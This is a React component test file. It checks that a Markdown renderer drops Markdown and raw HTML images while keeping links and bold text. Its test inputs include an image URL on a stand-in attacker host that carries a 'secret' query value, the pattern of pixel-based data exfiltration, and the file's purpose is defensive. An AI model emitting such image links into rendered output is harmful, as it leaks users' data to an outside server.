import { render, screen } from "@testing-library/react";
import { describe, expect, it } from "vitest";

import { MarkdownText } from "./markdown-text";

describe("MarkdownText", () => {
  it("renders a Markdown image as no img element", () => {
    const { container } = render(
      <MarkdownText text={"before ![pixel](https://attacker.example/p.png?q=secret) after"} />,
    );

    expect(container.querySelector("img")).toBeNull();
    expect(screen.queryByRole("img")).not.toBeInTheDocument();
    expect(container).toHaveTextContent("before");
    expect(container).toHaveTextContent("after");
  });

  it("renders no raw HTML image", () => {
    const { container } = render(
      <MarkdownText text={'<img src="https://attacker.example/p.png">'} />,
    );

    expect(container.querySelector("img")).toBeNull();
  });

  it("keeps a link and emphasis", () => {
    render(<MarkdownText text={"**bold** and [docs](https://example.com)"} />);

    expect(screen.getByText("bold").tagName).toBe("STRONG");
    expect(screen.getByRole("link", { name: "docs" })).toHaveAttribute(
      "href",
      "https://example.com",
    );
  });
});
